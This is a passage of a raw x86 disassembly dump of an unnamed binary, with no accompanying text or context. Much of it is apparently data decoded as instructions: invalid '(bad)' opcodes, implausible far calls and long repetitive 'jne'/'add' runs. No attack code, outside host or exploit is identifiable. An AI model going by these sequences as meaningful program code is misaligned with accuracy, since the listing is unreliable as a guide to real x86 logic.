  44377e:	test   ch,ah
  443780:	xor    BYTE PTR [edi],bh
  443782:	retf   
  443783:	int3   
  443784:	and    BYTE PTR [edi+0x83eb],al
  44378a:	add    BYTE PTR [eax],al
  44378c:	add    cl,dl
  44378e:	faddp  st(0),st
  443790:	inc    ebp
  443791:	mov    ebp,0x75000002
  443796:	cmp    eax,DWORD PTR [edx-0x24]
  443799:	sub    eax,0xba000002
  44379e:	mov    ebp,0x27501f3
  4437a3:	add    bh,al
  4437a5:	cmp    BYTE PTR [esi],dl
  4437a7:	(bad)  
  4437a8:	push   DWORD PTR [ebp+0x2]
  4437ab:	rol    DWORD PTR [ebp-0x67],0x2
  4437af:	add    BYTE PTR [eax],al
  4437b1:	jne    0x44373a
  4437b3:	dec    edx
  4437b4:	or     ah,bh
  4437b6:	add    al,0x80
  4437b8:	cli    
  4437b9:	mov    dh,0x2
  4437bb:	call   0xf857a269
  4437c0:	mov    eax,ds:0x3c17f5
  4437c5:	cwde   
  4437c6:	adc    edi,eax
  4437c8:	add    BYTE PTR [ebp-0x72],dh
  4437cb:	or     eax,edi
  4437cd:	js     0x443759
  4437cf:	cmc    
  4437d0:	inc    ebx
  4437d1:	jne    0x4437d5
  4437d3:	add    BYTE PTR [eax],al
  4437d5:	jne    0x4437fe
  4437d7:	add    eax,0xf58a70c7
  4437dc:	inc    ebx
  4437dd:	jne    0x4437e0
  4437df:	add    BYTE PTR [eax],al
  4437e1:	jne    0x443862
  4437e3:	cmp    al,BYTE PTR [eax-0x40f1]
  4437e9:	or     BYTE PTR [eax],0xc1
  4437ec:	add    eax,0x3c17ed
  4437f1:	add    BYTE PTR [eax],al
  4437f3:	add    BYTE PTR [eax],al
  4437f5:	add    BYTE PTR [ebp+0x2],dh
  4437f8:	add    BYTE PTR [eax],al
  4437fa:	not    ah
  4437fc:	xchg   edx,edi
  4437fe:	add    al,BYTE PTR ss:[eax]
  443801:	jne    0x443873
  443803:	test   al,0xff
  443805:	inc    BYTE PTR [eax+0x7543f5b2]
  44380b:	pop    edi
  44380c:	jg     0x443808
  44380e:	add    al,BYTE PTR ss:[ebp+0x3c17f50d]
  443815:	add    ah,ch
  443817:	(bad)  
  443818:	out    0x8b,eax
  44381a:	mov    BYTE PTR [edx-0x788abc0b],al
  443820:	inc    edx
  443821:	call   0x897ff89c
  443826:	xor    BYTE PTR [edx],ch
  443828:	test   BYTE PTR [ebp-0x63],cl
  44382b:	mov    BYTE PTR [edx],cl
  44382d:	ins    BYTE PTR es:[edi],dx
  44382e:	(bad)  
  44382f:	mov    esi,0xfe2567ff
  443834:	aas    
  443835:	add    BYTE PTR [edx-0x14],bh
  443838:	dec    edi
  443839:	cli    
  44383a:	mov    dh,0x2
  44383c:	popf   
  44383d:	mov    WORD PTR [edi-0x3a],gs
  443840:	inc    esi
  443842:	js     0x4438b2
  443844:	cmc    
  443845:	inc    ebx
  443846:	jne    0x4437df
  443848:	add    eax,DWORD PTR [eax+0x75]
  44384b:	call   0x1585:0x2b5045f
  443852:	icebp  
  443853:	or     al,0x3c
  443855:	add    BYTE PTR [edi+0xf7bd1a],ah
  44385b:	add    BYTE PTR [eax],al
  44385d:	add    BYTE PTR [eax],al
  44385f:	xor    dl,BYTE PTR [edx]
  443861:	jl     0x443827
  443863:	jge    0x4438ca
  443865:	xchg   edi,eax
  443866:	cli    
  443867:	mov    dh,0x2
  443869:	stc    
  44386a:	adc    eax,0x3c0cfd
  44386f:	(bad)  
  443870:	pop    edx
  443871:	cmc    
  443872:	inc    ebx
  443873:	jne    0x4438d8
  443875:	fwait
  443876:	cli    
  443877:	mov    dh,0x2
  443879:	push   eax
  44387a:	call   0x3c4940
  44387f:	test   BYTE PTR [esi+0x3],0x89
  443883:	xor    BYTE PTR [edx],dl
  443885:	test   BYTE PTR [ebp-0x1b],cl
  443888:	mov    bl,0xe7
  44388a:	aad    0xdb
  44388c:	adc    eax,edi
  44388e:	cmp    DWORD PTR [ecx-0x307b62fa],0xffffffc5
  443895:	dec    DWORD PTR [edx+0x6a4d1228]
  44389b:	jne    0x443900
  44389d:	cmp    edx,0x36
  4438a0:	add    dl,BYTE PTR [eax-0x18]
  4438a3:	or     DWORD PTR [edx],ebx
  4438a5:	clc    
  4438a6:	push   esi
  4438a8:	inc    esi
  4438a9:	or     ecx,DWORD PTR [ebx+0x4d861228]
  4438af:	xchg   ebp,eax
  4438b0:	jge    0x443904
  4438b2:	cld    
  4438b3:	dec    esi
  4438b4:	mov    bh,0xef
  4438b6:	jae    0x4438d7
  4438b8:	jge    0x4438fc
  4438ba:	loopne 0x4438e1
  4438bc:	jge    0x443908
  4438be:	fadd   st(4),st
  4438c0:	sbb    ch,BYTE PTR [ecx+0xfb]
  4438c6:	add    BYTE PTR [eax],al
  4438c8:	push   0x11
  4438ca:	jl     0x443890
  4438cc:	ins    DWORD PTR es:[edi],dx
  4438cd:	gs (bad) 
  4438cf:	cli    
  4438d0:	mov    dh,0x2
  4438d2:	test   DWORD PTR ds:0x3c0be5,edx
  4438d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4438d9:	arpl   WORD PTR [ebx-0x2fd4906],bx
  4438df:	inc    esp
  4438e0:	push   ecx
  4438e1:	mov    dl,0x84
  4438e3:	or     eax,0x3c0bf9
  4438e8:	jbe    0x4438a9
  4438ea:	sti    
  4438eb:	push   ecx
  4438ec:	or     eax,0x1afff639
  4438f1:	test   ebx,eax
  4438f3:	or     al,0xfe
  4438f5:	mov    dh,0xf3
  4438f7:	add    esp,DWORD PTR [eax+0x1954fc2e]
  4438fd:	jnp    0x443951
  4438ff:	in     al,0xee
  443901:	(bad)  
  443902:	sti    
  443903:	add    edi,DWORD PTR [eax]
  443905:	xchg   BYTE PTR cs:[ebp-0x17],al
  443909:	jl     0x443955
  44390b:	loopne 0x44389b
  44390d:	dec    DWORD PTR [edi-0x78fdc906]
  443913:	dec    ebp
  443914:	aad    0x1c
  443916:	cdq    
  443917:	(bad)  
  443918:	xor    BYTE PTR [edx],cl
  44391a:	(bad)  
  44391b:	push   DWORD PTR [ebp+0x2]
  44391e:	in     eax,0x9
  443920:	out    dx,al
  443921:	mov    dh,0xf7
  443923:	xor    DWORD PTR [edi-0x52aa78fb],0x7c
  44392a:	inc    edx
  44392b:	clc    
  44392c:	add    BYTE PTR [eax],al
  44392e:	add    BYTE PTR [eax],al
  443930:	add    BYTE PTR [esi-0x39],bl
  443933:	out    dx,eax
  443934:	jae    0x443993
  443936:	jge    0x443942
  443938:	test   BYTE PTR [edi+0x3802ffc4],cl
  44393e:	or     al,BYTE PTR [ecx+edx*1-0x5e08488a]
  443945:	icebp  
  443946:	or     edi,DWORD PTR [eax+eax*1]
  443949:	jbe    0x443910
  44394b:	test   DWORD PTR [ecx-0x7b5847b],0x3e641f4
  443955:	jne    0x443959
  443957:	test   DWORD PTR ds:0x3c0cf9,edx
  44395d:	jbe    0x443914
  44395f:	div    DWORD PTR [ebx]
  443961:	outs   dx,DWORD PTR ds:[esi]
  443962:	popa   
  443963:	cmp    edx,0xffffffb6
  443966:	add    bh,ch
  443968:	inc    esp
  443969:	sub    eax,0xe2eb077a
  44396e:	jns    0x44399a
  443970:	je     0x443991
  443972:	(bad)  
  443973:	dec    DWORD PTR [eax+0x43f59258]
  443979:	jne    0x44394e
  44397b:	(bad)  
  44397c:	mov    DWORD PTR [eax-0x66],eax
  44397f:	cmc    
  443980:	inc    ebx
  443981:	jne    0x443956
  443983:	(bad)  
  443984:	mov    DWORD PTR [eax-0x72],ebx
  443987:	cmc    
  443988:	inc    ebx
  443989:	jne    0x4439a5
  44398b:	dec    ecx
  44398c:	imul   edx
  44398e:	jp     0x3c4e1ba1
  443994:	add    BYTE PTR [eax],al
  443996:	add    BYTE PTR [eax],al
  443998:	add    BYTE PTR [eax],al
  44399a:	in     al,dx
  44399b:	mov    ebp,0x375b9f7
  4439a0:	inc    eax
  4439a1:	add    ah,dh
  4439a3:	sbb    edi,edi
  4439a5:	add    dh,BYTE PTR [ebp+0x2]
  4439a8:	test   DWORD PTR [ebp-0x43],edx
  4439ab:	fcmovne st,st(6)
  4439ad:	mov    DWORD PTR [eax+0x7543f58a],ecx
  4439b3:	popa   
  4439b4:	ja     0x4439b0
  4439b6:	add    dl,BYTE PTR ss:[eax-0x18]
  4439ba:	jno    0x4439c8
  4439bc:	clc    
  4439bd:	push   esi
  4439bf:	inc    esi
  4439c0:	add    ecx,DWORD PTR [ebx+0x43f58678]
  4439c6:	jne    0x443979
  4439c8:	out    0xd5,eax
  4439ca:	jg     0x4439db
  4439cc:	clc    
  4439cd:	test   DWORD PTR ds:0x35330395,esi
  4439d3:	sbb    esp,DWORD PTR ds:0xf596988b
  4439d9:	inc    ebx
  4439da:	jne    0x44395f
  4439dc:	ret    
  4439dd:	add    al,0xf6
  4439df:	int3   
  4439e0:	xchg   edx,edi
  4439e2:	mov    dh,0x2
  4439e4:	add    BYTE PTR [esp+ebp*2+0x61],dh
  4439e8:	arpl   dx,di
  4439ea:	mov    dh,0x2
  4439ec:	xchg   DWORD PTR [ecx+ebx*2+0x6],eax
  4439f0:	call   0xf8536252
  4439f5:	mov    ecx,DWORD PTR [eax+0x7543f566]
  4439fb:	mov    ah,0xbc
  4439fd:	xor    eax,DWORD PTR [eax]
  4439ff:	add    BYTE PTR [eax],al
  443a01:	add    BYTE PTR [eax],al
  443a03:	xor    eax,0x365de27b
  443a08:	ds retf 
  443a0a:	int3   
  443a0b:	jne    0x443a0f
  443a0d:	add    BYTE PTR [eax],al
  443a0f:	jne    0x443a13
  443a11:	add    BYTE PTR [eax],al
  443a13:	jne    0x443a17
  443a15:	add    BYTE PTR [eax],al
  443a17:	jne    0x443a1b
  443a19:	add    BYTE PTR [eax],al
  443a1b:	jne    0x443a1f
  443a1d:	add    BYTE PTR [eax],al
  443a1f:	jne    0x443a23
  443a21:	add    BYTE PTR [eax],al
  443a23:	jne    0x443a27
  443a25:	add    BYTE PTR [eax],al
  443a27:	jne    0x443a2b
  443a29:	add    BYTE PTR [eax],al
  443a2b:	jne    0x443a2f
  443a2d:	add    BYTE PTR [eax],al
  443a2f:	jne    0x443a33
  443a31:	add    BYTE PTR [eax],al
  443a33:	jne    0x443a37
  443a35:	add    BYTE PTR [eax],al
  443a37:	jne    0x443a3b
  443a39:	add    BYTE PTR [eax],al
  443a3b:	jne    0x443a3f
  443a3d:	add    BYTE PTR [eax],al
  443a3f:	jne    0x443a43
  443a41:	add    BYTE PTR [eax],al
  443a43:	jne    0x443a47
  443a45:	add    BYTE PTR [eax],al
  443a47:	jne    0x443a4b
  443a49:	add    BYTE PTR [eax],al
  443a4b:	jne    0x443a4f
  443a4d:	add    BYTE PTR [eax],al
  443a4f:	jne    0x443a53
  443a51:	add    BYTE PTR [eax],al
  443a53:	jne    0x443a57
  443a55:	add    BYTE PTR [eax],al
  443a57:	jne    0x443a5b
  443a59:	add    BYTE PTR [eax],al
  443a5b:	jne    0x443a5f
  443a5d:	add    BYTE PTR [eax],al
  443a5f:	jne    0x443a63
  443a61:	add    BYTE PTR [eax],al
  443a63:	jne    0x443a67
  443a65:	add    BYTE PTR [eax],al
  443a67:	add    BYTE PTR [eax],al
  443a69:	add    BYTE PTR [eax],al
  443a6b:	add    BYTE PTR [ebp+0x2],dh
  443a6e:	add    BYTE PTR [eax],al
  443a70:	jne    0x443a74
  443a72:	add    BYTE PTR [eax],al
  443a74:	jne    0x443a78
  443a76:	add    BYTE PTR [eax],al
  443a78:	jne    0x443a7c
  443a7a:	add    BYTE PTR [eax],al
  443a7c:	jne    0x443a80
  443a7e:	add    BYTE PTR [eax],al
  443a80:	jne    0x443a84
  443a82:	add    BYTE PTR [eax],al
  443a84:	jne    0x443a88
  443a86:	add    BYTE PTR [eax],al
  443a88:	jne    0x443a8c
  443a8a:	add    BYTE PTR [eax],al
  443a8c:	jne    0x443a90
  443a8e:	add    BYTE PTR [eax],al
  443a90:	jne    0x443a94
  443a92:	add    BYTE PTR [eax],al
  443a94:	jne    0x443a98
  443a96:	add    BYTE PTR [eax],al
  443a98:	jne    0x443a9c
  443a9a:	add    BYTE PTR [eax],al
  443a9c:	jne    0x443aa0
  443a9e:	add    BYTE PTR [eax],al
  443aa0:	jne    0x443aa4
  443aa2:	add    BYTE PTR [eax],al
  443aa4:	jne    0x443aa8
  443aa6:	add    BYTE PTR [eax],al
  443aa8:	jne    0x443aac
  443aaa:	add    BYTE PTR [eax],al
  443aac:	jne    0x443ab0
  443aae:	add    BYTE PTR [eax],al
  443ab0:	jne    0x443ab4
  443ab2:	add    BYTE PTR [eax],al
  443ab4:	jne    0x443ab8
  443ab6:	add    BYTE PTR [eax],al
  443ab8:	jne    0x443abc
  443aba:	add    BYTE PTR [eax],al
  443abc:	jne    0x443ac0
  443abe:	add    BYTE PTR [eax],al
  443ac0:	jne    0x443ac4
  443ac2:	add    BYTE PTR [eax],al
  443ac4:	jne    0x443ac8
  443ac6:	add    BYTE PTR [eax],al
  443ac8:	jne    0x443acc
  443aca:	add    BYTE PTR [eax],al
  443acc:	add    BYTE PTR [eax+eax*1],al
  443acf:	add    BYTE PTR [ebp+0x2],dh
  443ad2:	add    BYTE PTR [eax],al
  443ad4:	pop    ebp
  443ad5:	add    al,BYTE PTR [eax]
  443ad7:	add    cl,ch
  443ad9:	xor    DWORD PTR [eax-0x67cef6cd],edx
  443adf:	xor    ecx,DWORD PTR [ecx]
  443ae1:	xor    DWORD PTR [eax-0x57cee6cd],esp
  443ae7:	xor    esi,DWORD PTR [ebp-0x1e]
  443aea:	add    eax,DWORD PTR [eax]
  443aec:	ins    DWORD PTR es:[edi],dx
  443aed:	add    al,BYTE PTR [eax]
  443aef:	add    dh,al
  443af1:	cmp    eax,0x3d553fdb
  443af6:	jmp    0x333f:0xf83d4a3f
  443afd:	cmp    eax,0xf2750000
  443b02:	add    eax,DWORD PTR [eax]
  443b04:	adc    DWORD PTR [edx],eax
  443b06:	add    BYTE PTR [eax],al
  443b08:	push   esi
  443b09:	xor    ch,BYTE PTR [esi]
  443b0b:	xor    BYTE PTR [ebp+0x32],cl
  443b0e:	push   esp
  443b0f:	xor    BYTE PTR [eax-0x2bcf64ce],cl
  443b15:	xor    DWORD PTR [ecx+0x34334830],ebp
  443b1b:	xor    cl,BYTE PTR [edx-0x6fcce2cf]
  443b21:	xor    DWORD PTR [ebx+esi*1+0x40],edx
  443b25:	xor    DWORD PTR [edi+0x33],esi
  443b28:	imul   esi,DWORD PTR [esi],0x13
  443b2b:	xor    al,0x9e
  443b2d:	cmp    DWORD PTR ss:[edx+ecx*4],esi
  443b31:	ss dec edi
  443b33:	xor    al,0x0
  443b35:	add    BYTE PTR [eax],al
  443b37:	add    BYTE PTR [eax],al
  443b39:	and    DWORD PTR [esi],esi
  443b3b:	bound  esi,QWORD PTR [ebx+eax*2]
  443b3e:	xor    DWORD PTR ss:[esp+edi*8],0x348f35
  443b46:	ss test al,0x34
  443b49:	test   BYTE PTR [edi],dh
  443b4b:	pop    ss
  443b4c:	xor    eax,0x35db36c3
  443b51:	mov    al,ds:0x7535f636
  443b56:	xor    al,0x1d
  443b58:	ss dec ecx
  443b5a:	xor    al,0x3a
  443b5c:	ss daa 
  443b5e:	xor    al,0x75
  443b60:	ss adc al,0x35
  443b63:	test   eax,0xb6351a36
  443b68:	xor    DWORD PTR ss:0x353e36d5,esi
  443b6f:	jecxz  0x443ba7
  443b71:	pop    edi
  443b72:	xor    eax,0x354a36f1
  443b77:	getsec 
  443b79:	push   0x84372733
  443b7e:	xor    edi,DWORD PTR [ebx]
  443b80:	aaa    
  443b81:	mov    esp,0x94375333
  443b86:	xor    ebx,DWORD PTR [eax-0x5bcbfcc9]
  443b8c:	aaa    
  443b8d:	loopne 0x443bc2
  443b8f:	mov    edx,0xe342737
  443b94:	cmp    BYTE PTR [ebp+0x3a],ch
  443b97:	and    eax,0x3b3a4438
  443b9c:	cmp    BYTE PTR [eax],al
  443b9e:	add    BYTE PTR [eax],al
  443ba0:	add    BYTE PTR [eax],al
  443ba2:	mov    cl,0x3a
  443ba4:	dec    esi
  443ba5:	cmp    BYTE PTR [edx+edi*1+0x5e],cl
  443ba9:	cmp    BYTE PTR [ecx+0x3a],dl
  443bac:	ins    DWORD PTR es:[edi],dx
  443bad:	cmp    BYTE PTR [edx+0x3a],ah
  443bb0:	test   BYTE PTR [eax],bh
  443bb2:	out    dx,eax
  443bb3:	cmp    cl,BYTE PTR [edi-0x66c517c8]
  443bb9:	cmp    bl,ch
  443bbb:	cmp    ah,BYTE PTR [eax+edi*1+0x38b83b07]
  443bc2:	clc    
  443bc3:	cmp    al,dl
  443bc5:	cmp    dl,dl
  443bc7:	cmp    ch,dl
  443bc9:	cmp    BYTE PTR [ebx+0x57391c39],al
  443bcf:	cmp    DWORD PTR [ecx+edi*1],ebp
  443bd2:	inc    ebx
  443bd3:	cmp    DWORD PTR [ebx+0x39],edi
  443bd6:	std    
  443bd7:	cmp    DWORD PTR [ecx+edi*1+0x39b339d3],ebx
  443bde:	mov    esp,0xac39c139
  443be3:	cmp    esp,edx
  443be5:	cmp    DWORD PTR [ecx+0x39],edx
  443be8:	in     eax,dx
  443be9:	cmp    DWORD PTR [edi+0x39],esp
  443bec:	add    DWORD PTR [edx],edi
  443bee:	mov    BYTE PTR [eax],bh
  443bf0:	push   ds
  443bf1:	cmp    dl,BYTE PTR [ebx+0x753a3538]
  443bf7:	add    al,BYTE PTR [eax]
  443bf9:	add    BYTE PTR [ebp+0x2],dh
  443bfc:	add    BYTE PTR [eax],al
  443bfe:	jne    0x443c02
  443c00:	add    BYTE PTR [eax],al
  443c02:	jne    0x443c06
  443c04:	add    BYTE PTR [eax],al
  443c06:	add    BYTE PTR [eax],al
  443c08:	add    BYTE PTR [eax],al
  443c0a:	add    BYTE PTR [ebp+0x2],dh
  443c0d:	add    BYTE PTR [eax],al
  443c0f:	jne    0x443c13
  443c11:	add    BYTE PTR [eax],al
  443c13:	jne    0x443c17
  443c15:	add    BYTE PTR [eax],al
  443c17:	jne    0x443c1b
  443c19:	add    BYTE PTR [eax],al
  443c1b:	jne    0x443c1f
  443c1d:	add    BYTE PTR [eax],al
  443c1f:	jne    0x443c23
  443c21:	add    BYTE PTR [eax],al
  443c23:	jne    0x443c27
  443c25:	add    BYTE PTR [eax],al
  443c27:	jne    0x443c2b
  443c29:	add    BYTE PTR [eax],al
  443c2b:	jne    0x443c2f
  443c2d:	add    BYTE PTR [eax],al
  443c2f:	jne    0x443c33
  443c31:	add    BYTE PTR [eax],al
  443c33:	jne    0x443c37
  443c35:	add    BYTE PTR [eax],al
  443c37:	jne    0x443c3b
  443c39:	add    BYTE PTR [eax],al
  443c3b:	jne    0x443c3f
  443c3d:	add    BYTE PTR [eax],al
  443c3f:	jne    0x443c43
  443c41:	add    BYTE PTR [eax],al
  443c43:	jne    0x443c47
  443c45:	add    BYTE PTR [eax],al
  443c47:	jne    0x443c4b
  443c49:	add    BYTE PTR [eax],al
  443c4b:	jne    0x443c4f
  443c4d:	add    BYTE PTR [eax],al
  443c4f:	jne    0x443c53
  443c51:	add    BYTE PTR [eax],al
  443c53:	jne    0x443c57
  443c55:	add    BYTE PTR [eax],al
  443c57:	jne    0x443c5b
  443c59:	add    BYTE PTR [eax],al
  443c5b:	jne    0x443c5f
  443c5d:	add    BYTE PTR [eax],al
  443c5f:	jne    0x443c63
  443c61:	add    BYTE PTR [eax],al
  443c63:	jne    0x443c67
  443c65:	add    BYTE PTR [eax],al
  443c67:	jne    0x443c6b
  443c69:	add    BYTE PTR [eax],al
  443c6b:	jne    0x443c6f
  443c6d:	add    BYTE PTR [eax],al
  443c6f:	add    BYTE PTR [eax],al
  443c71:	add    BYTE PTR [eax],al
  443c73:	add    BYTE PTR [ebp+0x2],dh
  443c76:	add    BYTE PTR [eax],al
  443c78:	jne    0x443c7c
  443c7a:	add    BYTE PTR [eax],al
  443c7c:	jne    0x443c80
  443c7e:	add    BYTE PTR [eax],al
  443c80:	jne    0x443c84
  443c82:	add    BYTE PTR [eax],al
  443c84:	jne    0x443c88
  443c86:	add    BYTE PTR [eax],al
  443c88:	jne    0x443c8c
  443c8a:	add    BYTE PTR [eax],al
  443c8c:	jne    0x443c90
  443c8e:	add    BYTE PTR [eax],al
  443c90:	jne    0x443c94
  443c92:	add    BYTE PTR [eax],al
  443c94:	jne    0x443c98
  443c96:	add    BYTE PTR [eax],al
  443c98:	jne    0x443c9c
  443c9a:	add    BYTE PTR [eax],al
  443c9c:	jne    0x443ca0
  443c9e:	add    BYTE PTR [eax],al
  443ca0:	jne    0x443ca4
  443ca2:	add    BYTE PTR [eax],al
  443ca4:	jne    0x443ca8
  443ca6:	add    BYTE PTR [eax],al
  443ca8:	jne    0x443cac
  443caa:	add    BYTE PTR [eax],al
  443cac:	jne    0x443cb0
  443cae:	add    BYTE PTR [eax],al
  443cb0:	jne    0x443cb4
  443cb2:	add    BYTE PTR [eax],al
  443cb4:	jne    0x443cb8
  443cb6:	add    BYTE PTR [eax],al
  443cb8:	jne    0x443cbc
  443cba:	add    BYTE PTR [eax],al
  443cbc:	jne    0x443cc0
  443cbe:	add    BYTE PTR [eax],al
  443cc0:	jne    0x443cc4
  443cc2:	add    BYTE PTR [eax],al
  443cc4:	jne    0x443cc8
  443cc6:	add    BYTE PTR [eax],al
  443cc8:	jne    0x443ccc
  443cca:	add    BYTE PTR [eax],al
  443ccc:	jne    0x443cd0
  443cce:	add    BYTE PTR [eax],al
  443cd0:	jne    0x443cd4
  443cd2:	add    BYTE PTR [eax],al
  443cd4:	jne    0x443cd8
  443cd6:	add    BYTE PTR [eax],al
  443cd8:	add    BYTE PTR [eax],al
  443cda:	add    BYTE PTR [eax],al
  443cdc:	add    BYTE PTR [ebp+0x2],dh
  443cdf:	add    BYTE PTR [eax],al
  443ce1:	jne    0x443ce5
  443ce3:	add    BYTE PTR [eax],al
  443ce5:	jne    0x443ce9
  443ce7:	add    BYTE PTR [eax],al
  443ce9:	jne    0x443ced
  443ceb:	add    BYTE PTR [eax],al
  443ced:	jne    0x443cf1
  443cef:	add    BYTE PTR [eax],al
  443cf1:	jne    0x443cf5
  443cf3:	add    BYTE PTR [eax],al
  443cf5:	jne    0x443cf9
  443cf7:	add    BYTE PTR [eax],al
  443cf9:	jne    0x443cfd
  443cfb:	add    BYTE PTR [eax],al
  443cfd:	jne    0x443d01
  443cff:	add    BYTE PTR [eax],al
  443d01:	jne    0x443d05
  443d03:	add    BYTE PTR [eax],al
  443d05:	jne    0x443d09
  443d07:	add    BYTE PTR [eax],al
  443d09:	jne    0x443d0d
  443d0b:	add    BYTE PTR [eax],al
  443d0d:	jne    0x443d11
  443d0f:	add    BYTE PTR [eax],al
  443d11:	jne    0x443d15
  443d13:	add    BYTE PTR [eax],al
  443d15:	jne    0x443d19
  443d17:	add    BYTE PTR [eax],al
  443d19:	jne    0x443d1d
  443d1b:	add    BYTE PTR [eax],al
  443d1d:	jne    0x443d21
  443d1f:	add    BYTE PTR [eax],al
  443d21:	jne    0x443d25
  443d23:	add    BYTE PTR [eax],al
  443d25:	jne    0x443d29
  443d27:	add    BYTE PTR [eax],al
  443d29:	jne    0x443d2d
  443d2b:	add    BYTE PTR [eax],al
  443d2d:	jne    0x443d31
  443d2f:	add    BYTE PTR [eax],al
  443d31:	jne    0x443d35
  443d33:	add    BYTE PTR [eax],al
  443d35:	jne    0x443d39
  443d37:	add    BYTE PTR [eax],al
  443d39:	jne    0x443d3d
  443d3b:	add    BYTE PTR [eax],al
  443d3d:	jne    0x443d41
  443d3f:	add    BYTE PTR [eax],al
  443d41:	add    BYTE PTR [eax],al
  443d43:	add    BYTE PTR [eax],al
  443d45:	add    BYTE PTR [ebp+0x2],dh
  443d48:	add    BYTE PTR [eax],al
  443d4a:	jne    0x443d4e
  443d4c:	add    BYTE PTR [eax],al
  443d4e:	jne    0x443d52
  443d50:	add    BYTE PTR [eax],al
  443d52:	jne    0x443d56
  443d54:	add    BYTE PTR [eax],al
  443d56:	jne    0x443d5a
  443d58:	add    BYTE PTR [eax],al
  443d5a:	jne    0x443d5e
  443d5c:	add    BYTE PTR [eax],al
  443d5e:	jne    0x443d62
  443d60:	add    BYTE PTR [eax],al
  443d62:	jne    0x443d66
  443d64:	add    BYTE PTR [eax],al
  443d66:	jne    0x443d6a
  443d68:	add    BYTE PTR [eax],al
  443d6a:	jne    0x443d6e
  443d6c:	add    BYTE PTR [eax],al
  443d6e:	jne    0x443d72
  443d70:	add    BYTE PTR [eax],al
  443d72:	jne    0x443d76
  443d74:	add    BYTE PTR [eax],al
  443d76:	jne    0x443d7a
  443d78:	add    BYTE PTR [eax],al
  443d7a:	jne    0x443d7e
  443d7c:	add    BYTE PTR [eax],al
  443d7e:	jne    0x443d82
  443d80:	add    BYTE PTR [eax],al
  443d82:	jne    0x443d86
  443d84:	add    BYTE PTR [eax],al
  443d86:	jne    0x443d8a
  443d88:	add    BYTE PTR [eax],al
  443d8a:	jne    0x443d8e
  443d8c:	add    BYTE PTR [eax],al
  443d8e:	jne    0x443d92
  443d90:	add    BYTE PTR [eax],al
  443d92:	jne    0x443d96
  443d94:	add    BYTE PTR [eax],al
  443d96:	jne    0x443d9a
  443d98:	add    BYTE PTR [eax],al
  443d9a:	jne    0x443d9e
  443d9c:	add    BYTE PTR [eax],al
  443d9e:	jne    0x443da2
  443da0:	add    BYTE PTR [eax],al
  443da2:	jne    0x443da6
  443da4:	add    BYTE PTR [eax],al
  443da6:	jne    0x443daa
  443da8:	add    BYTE PTR [eax],al
  443daa:	add    BYTE PTR [eax],al
  443dac:	add    BYTE PTR [eax],al
  443dae:	add    BYTE PTR [ebp+0x2],dh
  443db1:	add    BYTE PTR [eax],al
  443db3:	jne    0x443db7
  443db5:	add    BYTE PTR [eax],al
  443db7:	jne    0x443dbb
  443db9:	add    BYTE PTR [eax],al
  443dbb:	jne    0x443dbf
  443dbd:	add    BYTE PTR [eax],al
  443dbf:	jne    0x443dc3
  443dc1:	add    BYTE PTR [eax],al
  443dc3:	jne    0x443dc7
  443dc5:	add    BYTE PTR [eax],al
  443dc7:	jne    0x443dcb
  443dc9:	add    BYTE PTR [eax],al
  443dcb:	jne    0x443dcf
  443dcd:	add    BYTE PTR [eax],al
  443dcf:	jne    0x443dd3
  443dd1:	add    BYTE PTR [eax],al
  443dd3:	jne    0x443dd7
  443dd5:	add    BYTE PTR [eax],al
  443dd7:	jne    0x443ddb
  443dd9:	add    BYTE PTR [eax],al
  443ddb:	jne    0x443ddf
  443ddd:	add    BYTE PTR [eax],al
  443ddf:	jne    0x443de3
  443de1:	add    BYTE PTR [eax],al
  443de3:	jne    0x443de7
  443de5:	add    BYTE PTR [eax],al
  443de7:	jne    0x443deb
  443de9:	add    BYTE PTR [eax],al
  443deb:	jne    0x443def
  443ded:	add    BYTE PTR [eax],al
  443def:	jne    0x443df3
  443df1:	add    BYTE PTR [eax],al
  443df3:	jne    0x443df7
  443df5:	add    BYTE PTR [eax],al
  443df7:	jne    0x443dfb
  443df9:	add    BYTE PTR [eax],al
  443dfb:	jne    0x443dff
  443dfd:	add    BYTE PTR [eax],al
  443dff:	jne    0x443e03
  443e01:	add    BYTE PTR [eax],al
  443e03:	jne    0x443e07
  443e05:	add    BYTE PTR [eax],al
  443e07:	jne    0x443e0b
  443e09:	add    BYTE PTR [eax],al
  443e0b:	jne    0x443e0f
  443e0d:	add    BYTE PTR [eax],al
  443e0f:	jne    0x443e13
  443e11:	add    BYTE PTR [eax],al
  443e13:	add    BYTE PTR [eax],al
  443e15:	add    BYTE PTR [eax],al
  443e17:	add    BYTE PTR [ebp+0x2],dh
  443e1a:	add    BYTE PTR [eax],al
  443e1c:	jne    0x443e20
  443e1e:	add    BYTE PTR [eax],al
  443e20:	jne    0x443e24
  443e22:	add    BYTE PTR [eax],al
  443e24:	jne    0x443e28
  443e26:	add    BYTE PTR [eax],al
  443e28:	jne    0x443e2c
  443e2a:	add    BYTE PTR [eax],al
  443e2c:	jne    0x443e30
  443e2e:	add    BYTE PTR [eax],al
  443e30:	jne    0x443e34
  443e32:	add    BYTE PTR [eax],al
  443e34:	jne    0x443e38
  443e36:	add    BYTE PTR [eax],al
  443e38:	jne    0x443e3c
  443e3a:	add    BYTE PTR [eax],al
  443e3c:	jne    0x443e40
  443e3e:	add    BYTE PTR [eax],al
  443e40:	jne    0x443e44
  443e42:	add    BYTE PTR [eax],al
  443e44:	jne    0x443e48
  443e46:	add    BYTE PTR [eax],al
  443e48:	jne    0x443e4c
  443e4a:	add    BYTE PTR [eax],al
  443e4c:	jne    0x443e50
  443e4e:	add    BYTE PTR [eax],al
  443e50:	jne    0x443e54
  443e52:	add    BYTE PTR [eax],al
  443e54:	jne    0x443e58
  443e56:	add    BYTE PTR [eax],al
  443e58:	jne    0x443e5c
  443e5a:	add    BYTE PTR [eax],al
  443e5c:	jne    0x443e60
  443e5e:	add    BYTE PTR [eax],al
  443e60:	jne    0x443e64
  443e62:	add    BYTE PTR [eax],al
  443e64:	jne    0x443e68
  443e66:	add    BYTE PTR [eax],al
  443e68:	jne    0x443e6c
  443e6a:	add    BYTE PTR [eax],al
  443e6c:	jne    0x443e70
  443e6e:	add    BYTE PTR [eax],al
  443e70:	jne    0x443e74
  443e72:	add    BYTE PTR [eax],al
  443e74:	jne    0x443e78
  443e76:	add    BYTE PTR [eax],al
  443e78:	jne    0x443e7c
  443e7a:	add    BYTE PTR [eax],al
  443e7c:	add    BYTE PTR [eax],al
  443e7e:	add    BYTE PTR [eax],al
  443e80:	add    BYTE PTR [ebp+0x2],dh
  443e83:	add    BYTE PTR [eax],al
  443e85:	jne    0x443e89
  443e87:	add    BYTE PTR [eax],al
